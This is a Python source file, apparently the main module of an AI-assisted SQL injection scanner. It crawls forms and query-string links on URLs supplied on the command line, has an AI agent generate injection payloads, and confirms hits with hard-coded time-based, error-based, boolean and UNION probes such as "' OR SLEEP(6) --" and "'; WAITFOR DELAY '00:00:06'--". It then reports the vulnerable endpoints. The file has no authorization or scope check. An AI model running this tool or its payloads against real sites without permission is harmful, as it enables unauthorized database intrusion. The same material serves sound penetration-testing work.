import sys
from agents import AIAgents
from agents import ClassifierAgent, ReporterAgent
from scanner import SQLScanner
from payloads import SQLPayloads
from config import Config
import httpx
import json
import hashlib

class MainApp:
    def __init__(self):
        self.ai = AIAgents()
        self.scanner = SQLScanner()
        self.classifier = ClassifierAgent()
        self.reporter = ReporterAgent()
        # httpx client for fast mutated requests
        self.http = httpx.Client(timeout=Config.TIMEOUT, headers={"User-Agent": Config.USER_AGENT})
        self.results = []
        # cache tested payload hashes per (url, param) to avoid duplicate requests
        # key: (target_url, param) -> set of payload_hash
        self._tested_hashes = {}
        # seen vulnerable endpoints (to avoid duplicate prints)
        self._seen_vuln_urls = set()
        # helper: whether to be quiet (only print vuln findings)
        self._only_vulns = getattr(Config, 'ONLY_PRINT_VULNERABLE', False)

    def _maybe_print(self, msg, *, force=False):
        """Print only when not in quiet mode, or when force=True."""
        if force or not self._only_vulns:
            print(msg)
    
    def scan_url(self, url):
        # Always show which URL we're scanning
        print(f"\n[+] Scanning: {url}")

        # baseline response (quick HTTP fetch)
        try:
            baseline = self.http.get(url)
            baseline_text = baseline.text
            baseline_time = baseline.elapsed.total_seconds()
        except Exception:
            baseline_text = ''
            baseline_time = 0

        forms = self.scanner.find_forms(url)
        if not forms:
            self._maybe_print("[-] No forms found")

        self._maybe_print(f"[+] Found {len(forms)} form(s)")

        for i, form in enumerate(forms):
            self._maybe_print(f"\n[*] Testing form {i+1} with {len(form['inputs'])} inputs")

            form_vuln_found = False

            # Classify risky params in this form
            risky = self.classifier.risky_params_from_form(form)
            self._maybe_print(f"[+] Risky params: {risky}")

            # For each risky param, try AI-generated payload first then standard payloads via httpx
            # fetch a baseline specifically for the form action so content-diff
            # comparisons are accurate for that endpoint (not the page root)
            action_url = form.get('action') or url
            try:
                br = self.http.get(action_url)
                action_baseline_text = br.text
                action_baseline_time = br.elapsed.total_seconds()
            except Exception:
                action_baseline_text = ''
                action_baseline_time = 0

            for param in risky:
                self._maybe_print(f"[*] Testing param '{param}' in form")

                # AI-generated payload for this single param
                form_info = [f"{inp['name']}({inp['type']})" for inp in form['inputs']]
                ai_resp = self.ai.generate_payload(form_info)
                # ai_resp is expected to be {'payload': str, 'hash': str}
                if isinstance(ai_resp, dict):
                    ai_payload = ai_resp.get('payload')
                    ai_hash = ai_resp.get('hash')
                else:
                    ai_payload = ai_resp
                    ai_hash = hashlib.sha256(str(ai_payload).encode('utf-8')).hexdigest()
                # Do not send the hash with requests; use it locally for caching/dedup
                self._maybe_print(f"[AI] Generated payload (hash available)")

                # initialize tested set for this (action,param)
                target_key = (form.get('action') or url, param)
                seen = self._tested_hashes.setdefault(target_key, set())
                if ai_hash in seen:
                    # already tried this exact payload for this endpoint+param
                    continue

                # Try variants of the AI payload (url-encoded, double-encoded, plus-encoded)
                from payloads import SQLPayloads as _PL
                tried_any = False
                # optimize: try only a few common variants (raw, url-encoded, plus)
                variants = _PL.variants(ai_payload)[:3]
                for variant in variants:
                    tried_any = True
                    try:
                        if form.get('method', 'get').lower() == 'get':
                            params = {inp['name']: (variant if inp['name']==param else '') for inp in form['inputs']}
                            r = self.http.get(form['action'], params=params)
                            response = {'url': r.url, 'source': r.text, 'time': r.elapsed.total_seconds(), 'status': r.status_code}
                        else:
                            data = {inp['name']: (variant if inp['name']==param else '') for inp in form['inputs']}
                            r = self.http.post(form['action'], data=data)
                            response = {'url': r.url, 'source': r.text, 'time': r.elapsed.total_seconds(), 'status': r.status_code}
                    except Exception:
                        response = None

                    if response:
                        ai_analysis = self.ai.analyze_response(response['url'], response['source'], variant)
                        self._maybe_print(f"[AI Analysis]: {ai_analysis} (variant={variant})")
                        # use the action-specific baseline for this form
                        det = self.scanner.detect_vulnerabilities(response, variant, baseline_source=action_baseline_text, baseline_time=action_baseline_time)
                        if det.get('vulnerable') or 'VULNERABLE' in ai_analysis:
                            # confirmation step: try confirmatory payloads to reduce false positives
                            confirmed = False
                            confirmed_payload = None
                            reason = det.get('reason')
                            if reason == 'time':
                                # try a clear sleep payload
                                try:
                                    sleep_payload = "' OR SLEEP(6) --"
                                    if form.get('method', 'get').lower() == 'get':
                                        params = {inp['name']: (sleep_payload if inp['name']==param else '') for inp in form['inputs']}
                                        rr = self.http.get(form['action'], params=params)
                                        resp2 = {'url': rr.url, 'source': rr.text, 'time': rr.elapsed.total_seconds(), 'status': rr.status_code}
                                    else:
                                        data = {inp['name']: (sleep_payload if inp['name']==param else '') for inp in form['inputs']}
                                        rr = self.http.post(form['action'], data=data)
                                        resp2 = {'url': rr.url, 'source': rr.text, 'time': rr.elapsed.total_seconds(), 'status': rr.status_code}
                                    det2 = self.scanner.detect_vulnerabilities(resp2, sleep_payload, baseline_source=action_baseline_text, baseline_time=action_baseline_time)
                                    if det2.get('vulnerable') and det2.get('reason') == 'time':
                                        confirmed = True
                                        confirmed_payload = sleep_payload
                                except Exception:
                                    pass
                            else:
                                # try error-based payloads to reproduce an error or large content diff
                                for try_payload in (SQLPayloads.ERROR + SQLPayloads.BASIC)[:8]:
                                    try:
                                        if form.get('method', 'get').lower() == 'get':
                                            params = {inp['name']: (try_payload if inp['name']==param else '') for inp in form['inputs']}
                                            rr = self.http.get(form['action'], params=params)
                                            resp2 = {'url': rr.url, 'source': rr.text, 'time': rr.elapsed.total_seconds(), 'status': rr.status_code}
                                        else:
                                            data = {inp['name']: (try_payload if inp['name']==param else '') for inp in form['inputs']}
                                            rr = self.http.post(form['action'], data=data)
                                            resp2 = {'url': rr.url, 'source': rr.text, 'time': rr.elapsed.total_seconds(), 'status': rr.status_code}
                                        det2 = self.scanner.detect_vulnerabilities(resp2, try_payload, baseline_source=action_baseline_text, baseline_time=action_baseline_time)
                                        if det2.get('vulnerable'):
                                            confirmed = True
                                            confirmed_payload = try_payload
                                            break
                                    except Exception:
                                        continue

                            severity = self.reporter.compute_severity(det, confirmed)
                            # record result (keep payload and local hash for audit)
                            result = {'url': response['url'], 'form': form, 'payload': ai_payload, 'payload_hash': ai_hash, 'vulnerable': True, 'ai_analysis': ai_analysis, 'param': param, 'detected': det, 'confirmed': confirmed, 'confirmed_payload': confirmed_payload, 'severity': severity}
                            self.results.append(result)
                            # mark this payload hash tested for this target
                            seen.add(ai_hash)
                            # Human-friendly reason label
                            reason_label = {
                                'time': 'Time-based (blind)',
                                'error': 'Error-based',
                                'content_diff': 'Content change',
                                'status_code_change': 'Status-code change'
                            }.get(det.get('reason'), det.get('reason'))
                            payload_shown = confirmed_payload or ai_payload
                            # Print only the vulnerable endpoint (as requested)
                            if response['url'] not in self._seen_vuln_urls:
                                # include severity/type if available in severity dict
                                print(response['url'])
                                self._seen_vuln_urls.add(response['url'])
                            form_vuln_found = True
                            break
                # if we found a vuln via AI variants, stop testing this param
                if form_vuln_found:
                    break

                # Optionally fall back to a limited standard payload bruteforce if configured
                if getattr(Config, 'BRUTE_FORCE_FALLBACK', False) and not form_vuln_found:
                    from payloads import SQLPayloads as _PL2
                    # optimize: limit to top-N standard payloads
                    for payload in list(SQLPayloads.get_all())[:12]:
                        for variant in _PL2.variants(payload)[:2]:
                            try:
                                if form.get('method', 'get').lower() == 'get':
                                    params = {inp['name']: (variant if inp['name']==param else '') for inp in form['inputs']}
                                    r = self.http.get(form['action'], params=params)
                                    response = {'url': r.url, 'source': r.text, 'time': r.elapsed.total_seconds(), 'status': r.status_code}
                                else:
                                    data = {inp['name']: (variant if inp['name']==param else '') for inp in form['inputs']}
                                    r = self.http.post(form['action'], data=data)
                                    response = {'url': r.url, 'source': r.text, 'time': r.elapsed.total_seconds(), 'status': r.status_code}
                            except Exception:
                                response = None

                            if response:
                                det = self.scanner.detect_vulnerabilities(response, variant, baseline_source=baseline_text, baseline_time=baseline_time)
                                if det.get('vulnerable'):
                                    # no extra confirmation for standard payloads (they are explicit), but mark confirmed
                                    severity = self.reporter.compute_severity(det, True)
                                    h = hashlib.sha256(str(variant).encode('utf-8')).hexdigest()
                                    result = {'url': response['url'], 'form': form, 'payload': variant, 'payload_hash': h, 'vulnerable': True, 'ai_analysis': 'Standard payload detection', 'param': param, 'detected': det, 'confirmed': True, 'confirmed_payload': variant, 'severity': severity}
                                    self.results.append(result)
                                    seen.add(h)
                                    # Print only the vulnerable endpoint
                                    if response['url'] not in self._seen_vuln_urls:
                                        print(response['url'])
                                        self._seen_vuln_urls.add(response['url'])
                                    form_vuln_found = True
                                    break

        # Crawl links on the page and test query-parameters found in links.
        # We test ALL parameters present in a URL (not just risky ones) as the
        # user requested. Each param is tested separately while other params
        # keep their original values.
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        query_links = self.scanner.find_query_params(url)
        if query_links:
            self._maybe_print(f"[+] Found {len(query_links)} link(s) with query parameters; testing them as injectable endpoints")

        for link in query_links:
            parsed = urlparse(link['url'])
            base_qs = parse_qs(parsed.query)

            # fetch baseline for this link's URL
            try:
                br = self.http.get(link['url'])
                link_baseline_text = br.text
                link_baseline_time = br.elapsed.total_seconds()
            except Exception:
                link_baseline_text = ''
                link_baseline_time = 0

            # test every parameter in the querystring
            for param in list(base_qs.keys()):
                self._maybe_print(f"[*] Testing param '{param}' in {link['url']}")

                # AI-generated payload for this param
                ai_resp = self.ai.generate_payload([f"{param}(query)"])
                if isinstance(ai_resp, dict):
                    ai_payload = ai_resp.get('payload')
                    ai_hash = ai_resp.get('hash')
                else:
                    ai_payload = ai_resp
                    ai_hash = hashlib.sha256(str(ai_payload).encode('utf-8')).hexdigest()

                # skip if we've tested this payload for this param+endpoint
                target_key = (link['url'], param)
                seen = self._tested_hashes.setdefault(target_key, set())
                if ai_hash in seen:
                    continue

                # build URL with payload in this param only
                qs = {k: (ai_payload if k == param else (v[0] if isinstance(v, list) else v)) for k, v in base_qs.items()}
                new_query = urlencode(qs)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

                try:
                    r = self.http.get(test_url)
                    response = {'url': r.url, 'source': r.text, 'time': r.elapsed.total_seconds(), 'status': r.status_code}
                except Exception:
                    response = None

                if not response:
                    continue

                ai_analysis = self.ai.analyze_response(test_url, response['source'], ai_payload)
                det = self.scanner.detect_vulnerabilities(response, ai_payload, baseline_source=link_baseline_text, baseline_time=link_baseline_time)
                if not (det.get('vulnerable') or 'VULNERABLE' in ai_analysis):
                    # not interesting
                    continue

                # stronger confirmation: repro with a small set of probes
                confirmed = False
                confirmed_payload = None
                sqli_type = None

                time_probes = ["' OR SLEEP(6) --", "' OR IF(1=1,SLEEP(6),0) --", "'; WAITFOR DELAY '00:00:06'--"]
                error_probes = SQLPayloads.ERROR + SQLPayloads.BASIC
                boolean_probes = ["' AND 1=1 --", "' AND 1=2 --", '" AND "1"="1" --']
                union_probes = ["' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --"]

                reason = det.get('reason')
                probe_order = [error_probes, boolean_probes, union_probes, time_probes]
                if reason == 'time':
                    probe_order = [time_probes, boolean_probes, error_probes, union_probes]

                for probe_group in probe_order:
                    for try_payload in probe_group[:6]:
                        try:
                            qs2 = {k: (try_payload if k == param else (v[0] if isinstance(v, list) else v)) for k, v in base_qs.items()}
                            new_q2 = urlencode(qs2)
                            test_url2 = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q2, parsed.fragment))
                            rr = self.http.get(test_url2)
                            resp2 = {'url': rr.url, 'source': rr.text, 'time': rr.elapsed.total_seconds(), 'status': rr.status_code}
                        except Exception:
                            continue

                        det2 = self.scanner.detect_vulnerabilities(resp2, try_payload, baseline_source=link_baseline_text, baseline_time=link_baseline_time)
                        if det2.get('vulnerable'):
                            confirmed = True
                            confirmed_payload = try_payload
                            if try_payload in time_probes or det2.get('reason') == 'time':
                                sqli_type = 'TIME-BASED (blind)'
                            elif 'union' in try_payload.lower():
                                sqli_type = 'UNION-BASED'
                            elif try_payload in error_probes or det2.get('reason') == 'error':
                                sqli_type = 'ERROR-BASED'
                            else:
                                sqli_type = 'BOOLEAN-BASED or CONTENT-DIFF'
                            break
                    if confirmed:
                        break

                severity = self.reporter.compute_severity(det, confirmed)
                result = {'url': test_url, 'form': None, 'payload': ai_payload, 'payload_hash': ai_hash, 'vulnerable': True, 'ai_analysis': ai_analysis, 'param': param, 'detected': det, 'confirmed': confirmed, 'confirmed_payload': confirmed_payload, 'severity': severity, 'sqli_type': sqli_type}
                self.results.append(result)
                seen.add(ai_hash)
                # print only url once
                if test_url not in self._seen_vuln_urls:
                    if sqli_type:
                        print(f"{test_url}  {sqli_type}")
                    else:
                        print(test_url)
                    self._seen_vuln_urls.add(test_url)

            # (Removed extra-path probing per user request.) We will not probe
            # common paths on the host; only form inputs are tested.
    
    def save_results(self, filename='results.json'):
        # Convert any URL/URL-like objects to strings so JSON dump succeeds
        serializable = []
        for r in self.results:
            rr = dict(r)
            if rr.get('url') is not None:
                rr['url'] = str(rr.get('url'))
            if rr.get('form') and isinstance(rr['form'], dict) and rr['form'].get('action') is not None:
                rr['form']['action'] = str(rr['form']['action'])
            serializable.append(rr)

        with open(filename, 'w') as f:
            json.dump(serializable, f, indent=2)
        print(f"\n[+] Results saved to {filename}")
    
    def run(self):
        if len(sys.argv) < 2:
            print("Usage: python main.py <url> [url2] [url3] ...")
            sys.exit(1)
        
        urls = sys.argv[1:]
        
        for url in urls:
            if not url.startswith('http'):
                url = 'http://' + url
            self.scan_url(url)
        
        # write final report via ReporterAgent (also keeps save_results for compatibility)
        try:
            self.reporter.report(self.results)
        except Exception:
            self.save_results()
        self.scanner.close()

if __name__ == "__main__":
    app = MainApp()
    app.run()